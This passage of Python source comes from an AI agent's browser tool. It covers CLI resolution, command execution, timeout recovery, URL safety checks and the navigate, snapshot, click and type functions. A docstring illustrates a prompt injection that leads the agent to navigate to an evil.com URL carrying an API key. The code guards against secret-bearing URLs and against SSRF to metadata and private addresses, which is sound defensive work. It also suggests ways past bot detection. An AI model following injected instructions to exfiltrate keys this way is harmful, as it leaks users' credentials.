    # would just hold an idle second CDP connection to the process.
    if not force_local and not (session_info.get("features") or {}).get("lightpanda"):
        _ensure_cdp_supervisor(task_id)

    return session_info


def _agent_browser_candidate_present(path: str | None) -> bool:
    if not path:
        return False
    if " " in path and path.split()[0].endswith("npx"):
        return True
    return os.path.exists(path) and (os.name == "nt" or os.access(path, os.X_OK))


def _resolve_npx_bin() -> Optional[str]:
    """Resolve a runnable npx, preferring the Hermes-managed/Homebrew extended PATH.

    Bare PATH first would let a broken system npx shadow a healthy managed one
    with no recovery, so every candidate is validated with ``node_tool_runnable``
    before being trusted.
    """
    extended_path = _merge_browser_path("")
    if extended_path:
        extended_npx = shutil.which("npx", path=extended_path)
        if extended_npx and node_tool_runnable(extended_npx):
            return extended_npx
    npx_path = shutil.which("npx")
    if npx_path and node_tool_runnable(npx_path):
        return npx_path
    return None


def _agent_browser_candidates(extended_path: str):
    """Yield agent-browser lookup candidates in resolution order (lazily — each is a filesystem probe).

    Order: ambient PATH (global install) → extended PATH (Hermes-managed Node,
    macOS versioned Homebrew, Termux/system dirs) → repo-local node_modules/.bin.
    The local lookup goes through ``shutil.which`` with an explicit path so
    Windows resolves the ``.cmd`` shim (CreateProcess cannot run npm's
    extensionless POSIX shim — WinError 193) while POSIX keeps the plain one.
    """
    yield shutil.which("agent-browser")
    if extended_path:
        yield shutil.which("agent-browser", path=extended_path)
    local_bin_dir = Path(__file__).parent.parent / "node_modules" / ".bin"
    if local_bin_dir.is_dir():
        yield shutil.which("agent-browser", path=str(local_bin_dir))


def _find_agent_browser(*, validate: bool = True) -> str:
    """
    Find the agent-browser CLI executable.

    Checks in order: current PATH, Homebrew/common bin dirs, Hermes-managed
    node, local node_modules/.bin/, npx fallback, then a lazy install.

    Every candidate is validated with ``agent_browser_runnable`` before it is
    cached. A bare ``shutil.which`` hit is NOT trusted: agent-browser's npm
    postinstall re-points a global symlink at our local node_modules binary,
    which disappears on the next ``hermes update`` and leaves a dangling link
    that ``which`` still reports but exec fails on (exit 127). Validating lets a
    dead candidate fall through instead of being cached and killing every
    browser tool. ``validate=False`` (schema-time check_fn) only tests presence
    and never caches.

    Raises:
        FileNotFoundError: If agent-browser is not installed
    """
    global _cached_agent_browser, _agent_browser_resolved
    if _agent_browser_resolved:
        if _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or ensure npx is available in your PATH."
            )
        return _cached_agent_browser

    def _accept(candidate: str) -> str:
        # _agent_browser_resolved is set at each accept site (not before the
        # search) so a concurrent reader never sees resolved=True with a None cache.
        global _cached_agent_browser, _agent_browser_resolved
        if validate:
            _cached_agent_browser = candidate
            _agent_browser_resolved = True
        return candidate

    ok = agent_browser_runnable if validate else _agent_browser_candidate_present
    extended_path = _merge_browser_path("")
    for candidate in _agent_browser_candidates(extended_path):
        if candidate and ok(candidate):
            return _accept(candidate)

    # npx fallback (also searches the extended PATH)
    if _resolve_npx_bin():
        return _accept(NPX_AGENT_BROWSER_SENTINEL)

    if not validate:
        raise FileNotFoundError("agent-browser CLI not found")

    # Nothing found — try lazy installation before giving up.
    try:
        from hermes_cli.dep_ensure import ensure_dependency
        if ensure_dependency("browser"):
            candidates = [
                shutil.which("agent-browser"),
                shutil.which("agent-browser", path=extended_path) if extended_path else None,
                shutil.which("agent-browser", path=str(get_hermes_home() / "node_modules" / ".bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node" / "bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node")),
            ]
            for recheck in candidates:
                if recheck and agent_browser_runnable(recheck):
                    return _accept(recheck)
    except Exception:
        pass

    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or ensure npx is available in your PATH."
    )


def warm_agent_browser_npx_cache(timeout: float = 60.0) -> bool:
    """Best-effort pre-fetch of the agent-browser npm package via npx.

    agent-browser resolves lazily via ``npx agent-browser`` (not a root
    package.json dependency), so the first invocation in a session would pay
    npx's registry fetch; ``hermes update`` / ``hermes doctor --fix`` call this
    to warm the cache first. Runs with the credential-scrubbed env every other
    agent-browser spawn uses (registry-fetched npm code must never see the
    operator keyring), in its own process group, and tree-kills on timeout so
    a surviving descendant cannot hold the capture pipe open.
    Never raises; True only when npx actually exited 0.
    """
    npx_bin = _resolve_npx_bin()
    if not npx_bin:
        return False

    env = _build_browser_env()
    env["PATH"] = _merge_browser_path(env.get("PATH", ""))

    popen_kwargs: dict = {
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "text": True,
        "env": env,
        "creationflags": windows_hide_flags(),
    }
    if os.name == "posix":
        popen_kwargs["start_new_session"] = True
    else:
        popen_kwargs["creationflags"] |= getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)

    cmd = [
        npx_bin,
        # --ignore-scripts: AGENT_BROWSER_NPX_SPEC is a floating ^0.26.0
        # range, not an exact pin — a compromised future 0.26.x patch must
        # not get to run its own install-time lifecycle scripts here.
        "--ignore-scripts",
        # --prefer-offline: once cached, repeat `hermes update`/`doctor
        # --fix` runs shouldn't hit the registry just to re-confirm
        # "latest" is still latest — that would defeat the point of
        # warming the cache in the first place.
        "--prefer-offline",
        "-y",
        AGENT_BROWSER_NPX_SPEC,
        "--version",
    ]
    try:
        proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, **popen_kwargs)
    except Exception:
        return False
    try:
        proc.communicate(timeout=timeout)
        return proc.returncode == 0
    except subprocess.TimeoutExpired:
        _kill_process_tree(proc)
        try:
            proc.communicate(timeout=5)
        except Exception:
            pass
        return False
    except Exception:
        _kill_process_tree(proc)
        return False


from tools.browser_tool_snapshot import (  # noqa: F401
    _store_full_snapshot,
    _truncate_snapshot,
    _redact_browser_output,
    _extract_screenshot_path_from_text,
)


def _discard_timed_out_browser_session(
    task_id: str,
    session_info: Dict[str, Any],
    task_socket_dir: str,
) -> None:
    """Drop a stuck client generation without losing cloud cleanup state."""
    with _cleanup_lock:
        if _active_sessions.get(task_id) is not session_info:
            return
        _stop_cdp_supervisor(task_id)
        if session_info.get("bb_session_id") or session_info.get("cdp_url"):
            import uuid
            replacement = dict(session_info)
            replacement["session_name"] = f"h_{uuid.uuid4().hex[:10]}"
            replacement.pop("_first_nav", None)
            _active_sessions[task_id] = replacement
        else:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        bare_task_id = _bare_task_id_for_session_key(task_id)
        if _last_active_session_key.get(bare_task_id) == task_id:
            _last_active_session_key.pop(bare_task_id, None)

    session_name = str(session_info.get("session_name") or "")
    if session_name:
        pid_file = os.path.join(task_socket_dir, f"{session_name}.pid")
        if os.path.isfile(pid_file):
            try:
                daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                if not _verify_reapable_browser_daemon(daemon_pid, task_socket_dir, session_name):
                    return
                # Tree-kill: the daemon spawns Chromium
                # children; terminating only the daemon PID leaks the whole
                # Chromium tree.  agent.deadline.kill_process_tree escalates
                # SIGTERM → SIGKILL across the tree.
                from agent import deadline as _deadline

                _deadline.kill_process_tree(daemon_pid)
            except (ProcessLookupError, ValueError, PermissionError, OSError):
                logger.debug("Could not kill timed-out browser daemon for %s", session_name)
                return
    shutil.rmtree(task_socket_dir, ignore_errors=True)


def _read_browser_daemon_pid(task_socket_dir: str, session_name: str) -> Optional[int]:
    """Read the agent-browser daemon PID for a session (best-effort)."""
    pid_file = os.path.join(task_socket_dir, f"{session_name}.pid")
    try:
        return int(Path(pid_file).read_text(encoding="utf-8").strip())
    except (OSError, ValueError):
        return None


def _browser_daemon_responsive(task_socket_dir: str, probe_timeout_s: float = 1.0) -> bool:
    """Cheap liveness probe: connect to the daemon's unix control socket.

    A successful connect proves the accept loop is alive (the command wedged on
    the page/CDP side, not the daemon). Windows uses named pipes — no probe is
    possible, so report unresponsive (tree-kill + respawn is the safe recovery).
    """
    if os.name == "nt":
        return False
    import socket as socket_mod

    if not hasattr(socket_mod, "AF_UNIX"):
        return False
    try:
        entries = os.listdir(task_socket_dir)
    except OSError:
        return False
    sock_paths = [
        os.path.join(task_socket_dir, e) for e in entries if e.endswith(".sock")
    ]
    for sock_path in sock_paths:
        try:
            with socket_mod.socket(socket_mod.AF_UNIX, socket_mod.SOCK_STREAM) as s:
                s.settimeout(probe_timeout_s)
                s.connect(sock_path)
                return True
        except OSError:
            continue
    return False


def _handle_browser_command_timeout(
    task_id: str,
    session_info: Dict[str, Any],
    task_socket_dir: str,
) -> None:
    """Recover session state after a browser command timeout.

    * Cloud / CDP sessions: no local daemon to probe — replace the stuck client
      generation now (fresh ``session_name``, same ``bb_session_id`` so cloud
      cleanup still works).
    * Local daemon alive (PID live, identity-verified, control socket accepts):
      only the *command* wedged; mark the session suspect and let the next use
      recycle it via ``ensure_healthy`` → clean ``close`` → fresh session.
    * Local daemon wedged/dead: it cannot service a clean close and its Chromium
      children would leak — tree-kill and evict now; the next call respawns.

    Both local branches ``mark_suspect`` first (cheap, lock-free) so the
    poisoned-cache invariant holds even if eviction races another thread's
    replacement (the flag then costs one harmless no-op teardown).
    """
    if session_info.get("bb_session_id") or session_info.get("cdp_url"):
        _discard_timed_out_browser_session(task_id, session_info, task_socket_dir)
        return

    _browser_session_backend(task_id).mark_suspect(
        "browser command timed out; session may be poisoned"
    )

    session_name = str(session_info.get("session_name") or "")
    daemon_pid = _read_browser_daemon_pid(task_socket_dir, session_name) if session_name else None
    daemon_alive = (
        daemon_pid is not None
        and _pid_exists(daemon_pid)
        and _verify_reapable_browser_daemon(daemon_pid, task_socket_dir, session_name)
        and _browser_daemon_responsive(task_socket_dir)
    )
    if daemon_alive:
        logger.warning(
            "browser daemon for %s is alive after command timeout; session "
            "marked suspect and will be recycled at next use", task_id,
        )
        return

    logger.warning(
        "browser daemon for %s is wedged or dead after command timeout; "
        "tree-killing and evicting the session", task_id,
    )
    _discard_timed_out_browser_session(task_id, session_info, task_socket_dir)
    # The poisoned entry is gone (evicted, or superseded by a concurrent
    # replacement discard refused to touch) — either way the cache no longer
    # holds the timed-out session, so drop the flag: it must not poison a
    # session created later under the same key.
    _suspect_browser_sessions.pop(task_id, None)


def _interpret_browser_command_output(command: str, stdout: str, stderr: str, returncode: int) -> Dict[str, Any]:
    """Turn a finished agent-browser process's output into a result dict.

    Empty stdout with rc=0 is a broken state (stale daemon) and is reported as
    failure rather than a silent ``{"success": True, "data": {}}`` — except for
    commands in ``_EMPTY_OK_COMMANDS``. Non-JSON output is an error, except
    for ``screenshot`` where the saved path is recovered from the prose.
    """
    if stderr and stderr.strip():
        level = logging.WARNING if returncode != 0 else logging.DEBUG
        logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

    stdout_text = stdout.strip()
    if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
        logger.warning("browser '%s' returned empty output (rc=0)", command)
        return {"success": False, "error": f"Browser command '{command}' returned no output"}
    if not stdout_text:
        if returncode != 0:
            error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
            logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
            return {"success": False, "error": error_msg}
        return {"success": True, "data": {}}

    try:
        parsed = json.loads(stdout_text)
    except json.JSONDecodeError:
        raw = stdout_text[:2000]
        logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
                       command, returncode, raw[:500])
        if command == "screenshot":
            stderr_text = (stderr or "").strip()
            combined_text = "\n".join(part for part in [stdout_text, stderr_text] if part)
            recovered_path = _extract_screenshot_path_from_text(combined_text)
            if recovered_path and Path(recovered_path).exists():
                logger.info(
                    "browser 'screenshot' recovered file from non-JSON output: %s",
                    recovered_path,
                )
                return {"success": True, "data": {"path": recovered_path, "raw": raw}}
        return {"success": False, "error": f"Non-JSON output from agent-browser for '{command}': {raw}"}

    # Empty snapshot content is a common sign of daemon/CDP issues.
    if command == "snapshot" and parsed.get("success"):
        snap_data = parsed.get("data", {})
        if not snap_data.get("snapshot") and not snap_data.get("refs"):
            logger.warning("snapshot returned empty content. "
                           "Possible stale daemon or CDP connection issue. "
                           "returncode=%s", returncode)
    return parsed


def _run_browser_command(
    task_id: str,
    command: str,
    args: List[str] = None,
    timeout: Optional[int] = None,
    _engine_override: Optional[str] = None,
) -> Dict[str, Any]:
    """Run one agent-browser CLI command against the task's session; returns its parsed JSON.

    ``timeout=None`` reads ``browser.command_timeout`` (default 30s).
    ``_engine_override`` forces an engine for this call only (the Lightpanda
    fallback uses it to retry with Chrome without touching global state).
    """
    if timeout is None:
        timeout = _safe_command_timeout()
    args = args or []

    # Build the command
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    if _requires_real_termux_browser_install(browser_cmd):
        error = _termux_browser_install_error()
        logger.warning("browser command blocked on Termux: %s", error)
        return {"success": False, "error": error}

    # Local mode with no Chromium on disk: fail fast with an actionable
    # message instead of hanging for _command_timeout seconds per call.
    # Skip when engine=lightpanda — LP doesn't need Chromium for navigation.
    if (
        _is_local_mode()
        and not _chromium_installed()
        and _get_browser_engine() != "lightpanda"
        and not _maybe_autoinstall_chromium()
    ):
        if _running_in_docker():
            hint = (
                "Chromium browser is missing. You're running in Docker — pull "
                "the latest image to get the bundled Chromium: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hint = (
                "Chromium browser is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        logger.warning("browser command blocked: %s", hint)
        return {"success": False, "error": hint}

    from tools.interrupt import is_interrupted
    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    # Get session info (creates Browserbase session with proxies if needed)
    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}
    # Cleanup stops the supervisor before closing the backend; keep it stopped.
    if command != "close" and session_info.get("cdp_url"):
        _ensure_cdp_supervisor(task_id)

    # Build the command with the appropriate backend flag.
    # Cloud mode: --cdp <websocket_url> connects to Browserbase.
    # Local mode: --session <name> launches a local headless Chromium.
    # The rest of the command (--json, command, args) is identical.
    if session_info.get("cdp_url"):
        # Cloud mode — connect to remote Browserbase browser via CDP
        # IMPORTANT: Do NOT use --session with --cdp. In agent-browser >=0.13,
        # --session creates a local browser instance and silently ignores --cdp.
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # Local mode — launch Chromium (headless by default, headed when configured)
        backend_args = ["--session", session_info["session_name"]]
        if _is_headed_mode():
            backend_args.append("--headed")

    # Lightpanda engine injection (local mode only, agent-browser v0.25.3+).
    # Use the resolved session backend rather than global cloud-provider state:
    # hybrid private-URL routing can create a local sidecar while a cloud
    # provider remains configured for public URLs.
    engine = _engine_override or _get_browser_engine()
    if engine != "auto" and not _is_camofox_mode() and not session_info.get("cdp_url"):
        backend_args += ["--engine", engine]

    cmd_parts = _agent_browser_argv(browser_cmd) + backend_args + ["--json", command] + args

    try:
        task_socket_dir = _prepare_session_socket_dir(session_info["session_name"])
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                     command, task_id, task_socket_dir, len(task_socket_dir))
        browser_env = _agent_browser_command_env(task_socket_dir)

        # Chromium-only launch flags are rejected by Lightpanda. Strip both
        # the current and legacy variables for Lightpanda commands; explicit
        # Chrome commands and fallback use the shared Chromium policy.
        if engine == "lightpanda":
            _stripped_args = browser_env.pop("AGENT_BROWSER_ARGS", None)
            _stripped_flags = browser_env.pop("AGENT_BROWSER_CHROME_FLAGS", None)
            if _stripped_args is not None or _stripped_flags is not None:
                logger.debug(
                    "browser: stripped Chromium-only AGENT_BROWSER_ARGS/"
                    "AGENT_BROWSER_CHROME_FLAGS for Lightpanda command %s "
                    "(agent-browser rejects them with --engine lightpanda)",
                    command,
                )
        else:
            _apply_chromium_sandbox_args(browser_env)

        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        proc = _popen_agent_browser(cmd_parts, browser_env, task_socket_dir, command)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            stdout, stderr = _read_command_output_files(stdout_path, stderr_path)
            _unlink_command_output_files(stdout_path, stderr_path)
            _handle_browser_command_timeout(task_id, session_info, task_socket_dir)
            if stderr and stderr.strip():
                logger.warning(
                    "browser '%s' stderr after timeout: %s",
                    command,
                    stderr.strip()[:500],
                )
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                           command, timeout, task_id, task_socket_dir)
            result = {
                "success": False,
                "error": _format_browser_timeout_error(command, timeout, stdout, stderr),
            }
            # Fall through to fallback check below
        else:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read()
            with open(stderr_path, "r", encoding="utf-8") as f:
                stderr = f.read()
            _unlink_command_output_files(stdout_path, stderr_path)
            result = _interpret_browser_command_output(command, stdout, stderr, proc.returncode)

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        result = {"success": False, "error": str(e)}

    # --- Lightpanda automatic Chrome fallback ---
    # If engine is lightpanda and the result looks broken, retry with Chrome.
    # This runs for ALL exit paths (timeout, empty, non-JSON, nonzero rc, parsed).
    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
    if fallback_reason:
        logger.info(
            "Lightpanda fallback: retrying '%s' with Chrome (task=%s): %s",
            command,
            task_id,
            fallback_reason,
        )
        # For screenshots, use the dedicated Chrome fallback helper
        # (spins up a separate Chrome session to the same URL).
        if command == "screenshot":
            fallback_result = _chrome_fallback_screenshot(task_id, args or [], timeout)
        else:
            fallback_result = _run_chrome_fallback_command(task_id, command, args, timeout)
        return _annotate_lightpanda_fallback(fallback_result, fallback_reason)

    return result


# ============================================================================
# Browser Tool Functions
# ============================================================================

def _secret_url_error(url: str) -> Optional[dict]:
    """Refuse URLs that embed an API key/token (raw and URL-decoded, catching ``%2D`` tricks).

    A prompt injection could otherwise make the agent navigate to
    ``https://evil.com/steal?key=sk-ant-...`` to exfiltrate secrets.
    """
    import urllib.parse
    from agent.redact import _PREFIX_RE

    if _PREFIX_RE.search(url) or _PREFIX_RE.search(urllib.parse.unquote(url)):
        return {"success": False, "error": "Blocked: URL contains what appears to be an API key or token. Secrets must not be sent in URLs."}
    return None


def _url_policy_error(url: str, *, auto_local: bool = False) -> Optional[dict]:
    """Backend-aware URL checks on an already-normalized URL; None if allowed.

    Order matters and every step is a floor for the next:
      1. Credential-like query params are refused for cloud backends (third-party
         readers) — allowed for local backends and for the hybrid local sidecar.
      2. Cloud metadata / IMDS endpoints are refused UNCONDITIONALLY, for every
         backend including pure-local Chromium and off-host CDP (a local Chromium
         on a cloud VM still reaches the host IMDS).
      3. Private/internal addresses are refused unless the backend is local, the
         URL is being auto-routed to the local sidecar (``auto_local``), or
         ``browser.allow_private_urls`` opts out.
      4. Website policy (config allow/deny lists).
    """
    local = _is_local_backend()
    sensitive_query_key = _sensitive_query_param_name(url)
    if sensitive_query_key and not local and not auto_local:
        return {"success": False, "error": (
            "Blocked: URL contains a credential-like query parameter "
            f"({sensitive_query_key}). Cloud browser backends are third-party "
            "readers; use a local browser/CDP session or remove the sensitive "
            "query parameter before navigating.")}
    if _is_always_blocked_url(url):
        return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
    if not local and not auto_local and not _allow_private_urls() and not _is_safe_url(url):
        return {"success": False, "error": "Blocked: URL targets a private or internal address"}
    blocked = check_website_access(url)
    if blocked:
        return {"success": False, "error": blocked["message"],
                "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]}}
    return None


def evaluate_url_safety(url: str) -> Optional[dict]:
    """Run URL safety checks; None if safe, else an error dict"""
    err = _secret_url_error(url)
    if err:
        return err
    url = _normalize_url_for_request(url)
    return _secret_url_error(url) or _url_policy_error(url)


_BOT_DETECTION_TITLE_PATTERNS = (
    "access denied", "access to this page has been denied",
    "blocked", "bot detected", "verification required",
    "please verify", "are you a robot", "captcha",
    "cloudflare", "ddos protection", "checking your browser",
    "just a moment", "attention required",
)


def _post_redirect_block(nav_session_key: str, url: str, final_url: str, auto_local_this_nav: bool) -> Optional[str]:
    """Post-redirect SSRF check; returns a blocked JSON payload or None.

    If the browser followed a redirect to a private/internal address the model
    could read internal content via later snapshots, so the page is navigated to
    about:blank first. The cloud-metadata floor fires for every backend (even the
    local sidecar); the private-address check is skipped for local backends and
    the hybrid sidecar, and when ``browser.allow_private_urls`` opts out.
    """
    if not final_url or final_url == url:
        return None
    if _is_always_blocked_url(final_url):
        _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
        return json.dumps({
            "success": False,
            "error": "Blocked: redirect landed on a cloud metadata endpoint",
        })
    if (
        not _is_local_backend()
        and not auto_local_this_nav
        and not _allow_private_urls()
        and not _is_safe_url(final_url)
    ):
        _run_browser_command(nav_session_key, "open", ["about:blank"], timeout=10)
        return json.dumps({
            "success": False,
            "error": "Blocked: redirect landed on a private/internal address",
        })
    return None


def _attach_auto_snapshot(response: Dict[str, Any], nav_session_key: str) -> None:
    """Add a compact snapshot to a navigate response so the model can act without browser_snapshot."""
    try:
        snap_result = _run_browser_command(nav_session_key, "snapshot", ["-c"])
        if snap_result.get("success"):
            snap_data = snap_result.get("data", {})
            snapshot_text = snap_data.get("snapshot", "")
            refs = snap_data.get("refs", {})
            threshold = get_browser_snapshot_threshold()
            if len(snapshot_text) > threshold:
                snapshot_text = _truncate_snapshot(snapshot_text, max_chars=threshold)
            response["snapshot"] = _redact_browser_output(snapshot_text)
            response["element_count"] = len(refs) if refs else 0
            if snap_result.get("fallback_warning") and not response.get("fallback_warning"):
                _copy_fallback_warning(response, snap_result)
    except Exception as e:
        logger.debug("Auto-snapshot after navigate failed: %s", e)


def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
    """Navigate to ``url``; returns JSON with title, compact snapshot and, on first nav, stealth features."""
    # Hybrid routing decides BEFORE the safety checks whether this URL goes to a
    # local Chromium sidecar (cloud provider configured + private URL +
    # ``browser.auto_local_for_private_urls``); the cloud provider never sees
    # the URL in that case, so the private-address checks are relaxed for it.
    safety_error = _secret_url_error(url)
    if safety_error is None:
        url = _normalize_url_for_request(url)
        safety_error = _secret_url_error(url)
    if safety_error is not None:
        return json.dumps(safety_error)

    effective_task_id = task_id or "default"
    nav_session_key = _navigation_session_key(effective_task_id, url)
    auto_local_this_nav = _is_local_sidecar_key(nav_session_key)

    safety_error = _url_policy_error(url, auto_local=auto_local_this_nav)
    if safety_error is not None:
        return json.dumps(safety_error)

    # Camofox backend — delegate after safety checks pass
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_navigate
        return camofox_navigate(url, task_id)

    if auto_local_this_nav:
        logger.info(
            "browser_navigate: auto-routing %s to local Chromium sidecar "
            "(cloud provider %s stays on cloud for public URLs; "
            "set browser.auto_local_for_private_urls: false to disable)",
            url,
            type(_get_cloud_provider()).__name__ if _get_cloud_provider() else "none",
        )

    # Get session info to check if this is a new session
    # (will create one with features logged if not exists)
    session_info = _get_session_info(nav_session_key)
    is_first_nav = session_info.get("_first_nav", True)

    # Auto-start recording if configured and this is first navigation
    if is_first_nav:
        session_info["_first_nav"] = False
        _maybe_start_recording(nav_session_key)

    result = _run_browser_command(
        nav_session_key,
        "open",
        [url],
        timeout=_get_open_command_timeout(first_open=is_first_nav),
    )

    if not result.get("success"):
        return json.dumps({
            "success": False,
            "error": result.get("error", "Navigation failed")
        }, ensure_ascii=False)

    data = result.get("data", {})
    title = data.get("title", "")
    final_url = data.get("url", url)

    blocked = _post_redirect_block(nav_session_key, url, final_url, auto_local_this_nav)
    if blocked is not None:
        return blocked

    response = {
        "success": True,
        "url": final_url,
        "title": title
    }
    # Auditability: stamp navigations that ran on the user's real-profile
    # copy-browser so usage is visible in the tool result.
    try:
        if (session_info.get("features") or {}).get("real_profile"):
            response["used_real_profile"] = True
    except Exception:
        pass
    # Remember only a successful, non-blocked navigation as the task owner.
    # Failed opens and blocked redirects must not retarget follow-up clicks
    # or snapshots to a newly-created but irrelevant session.
    _last_active_session_key[effective_task_id] = nav_session_key
    _copy_fallback_warning(response, result)

    title_lower = title.lower()
    if any(pattern in title_lower for pattern in _BOT_DETECTION_TITLE_PATTERNS):
        response["bot_detection_warning"] = (
            f"Page title '{title}' suggests bot detection. The site may have blocked this request. "
            "Options: 1) Try adding delays between actions, 2) Access different pages first, "
            "3) Enable advanced stealth (BROWSERBASE_ADVANCED_STEALTH=true, requires Scale plan), "
            "4) Some sites have very aggressive bot detection that may be unavoidable."
        )

    # Include feature info on first navigation so model knows what's active
    if is_first_nav and "features" in session_info:
        features = session_info["features"]
        active_features = [k for k, v in features.items() if v]
        if not features.get("proxies"):
            response["stealth_warning"] = (
                "Running WITHOUT residential proxies. Bot detection may be more aggressive. "
                "Consider upgrading Browserbase plan for proxy support."
            )
        response["stealth_features"] = active_features

    _attach_auto_snapshot(response, nav_session_key)
    return json.dumps(response, ensure_ascii=False)


def browser_snapshot(
    full: bool = False,
    task_id: Optional[str] = None,
    user_task: Optional[str] = None
) -> str:
    """Text snapshot of the page's accessibility tree (compact unless ``full``).

    ``user_task`` is deprecated and unused: oversized snapshots always
    truncate-and-store (no LLM pass).
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_snapshot
        return camofox_snapshot(full, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Build command args based on full flag
    args = []
    if not full:
        args.extend(["-c"])  # Compact mode

    result = _run_browser_command(effective_task_id, "snapshot", args)

    if result.get("success"):
        data = result.get("data", {})
        snapshot_text = data.get("snapshot", "")
        refs = data.get("refs", {})

        # ── Private-network guard: block snapshots from eval-navigated private pages ──
        blocked = _blocked_private_page_content(effective_task_id)
        if blocked is not None:
            return blocked

        # Oversized snapshots truncate at line boundaries; the full
        # accessibility tree is stored to cache/web and the appended note
        # tells the agent how to page through it with read_file (same
        # pattern as web_extract — no LLM summarization). Threshold is
        # configurable via browser.snapshot_threshold.
        threshold = get_browser_snapshot_threshold()
        if len(snapshot_text) > threshold:
            snapshot_text = _truncate_snapshot(snapshot_text, max_chars=threshold)

        response = {
            "success": True,
            "snapshot": _redact_browser_output(snapshot_text),
            "element_count": len(refs) if refs else 0
        }
        _copy_fallback_warning(response, result)

        # Merge supervisor state (pending dialogs + frame tree) when a CDP
        # supervisor is attached to this task. No-op otherwise. See
        # website/docs/developer-guide/browser-supervisor.md.
        try:
            from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
            _supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
            if _supervisor is not None:
                _sv_snap = _supervisor.snapshot()
                if _sv_snap.active:
                    response.update(_redact_browser_output(_sv_snap.to_dict()))
        except Exception as _sv_exc:
            logger.debug("supervisor snapshot merge failed: %s", _sv_exc)

        return json.dumps(response, ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get snapshot")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def _tool_response(result: Dict[str, Any], ok: Dict[str, Any], default_error: str) -> str:
    """Standard tool JSON for a ``_run_browser_command`` result.

    Success → ``{"success": True, **ok}``; failure → ``{"success": False,
    "error": result.error or default_error}``. Lightpanda fallback metadata
    is copied onto either shape.
    """
    if result.get("success"):
        response = {"success": True, **ok}
    else:
        response = {"success": False, "error": result.get("error", default_error)}
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_click(ref: str, task_id: Optional[str] = None) -> str:
    """Click the element ``ref`` (e.g. "@e5")."""
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_click
        return camofox_click(ref, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "click")
    if blocked is not None:
        return blocked

    if not ref.startswith("@"):
        ref = f"@{ref}"
    result = _run_browser_command(effective_task_id, "click", [ref])
    return _tool_response(result, {"clicked": ref}, f"Failed to click {ref}")


def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
    """Type ``text`` into the element ``ref`` (fill: clears, then types)."""
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_type
        return camofox_type(ref, text, task_id)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "type")
    if blocked is not None:
        return blocked

    if not ref.startswith("@"):
        ref = f"@{ref}"
    # fill clears then types
    result = _run_browser_command(effective_task_id, "fill", [ref, text])

    from agent.display import (
        redact_browser_typed_text_for_display,
        redact_tool_args_for_display,
    )

    # Typed text goes through the secret-pattern redactor so API keys / tokens
    # don't leak into tool progress or chat history (the raw value was already
    # sent to the browser above); normal text passes through unchanged.
    display_text = (redact_tool_args_for_display("browser_type", {"text": text}) or {})["text"]
    if result.get("success"):
        response = {"success": True, "typed": display_text, "element": ref}
    else:
        response = {"success": False, "error": result.get("error", f"Failed to type into {ref}")}
    response = _copy_fallback_warning(response, result)
    response = redact_browser_typed_text_for_display(response, text)
    return json.dumps(response, ensure_ascii=False)


def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
    """Scroll the page ``direction`` ("up"/"down") by about half a viewport."""
    if direction not in {"up", "down"}:
        return json.dumps({
            "success": False,
            "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
        }, ensure_ascii=False)

    # Single scroll with a pixel amount (~half a viewport) instead of 5x subprocess calls.
    _SCROLL_PIXELS = 500

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_scroll
        # Camofox REST API doesn't support pixel args; use repeated calls
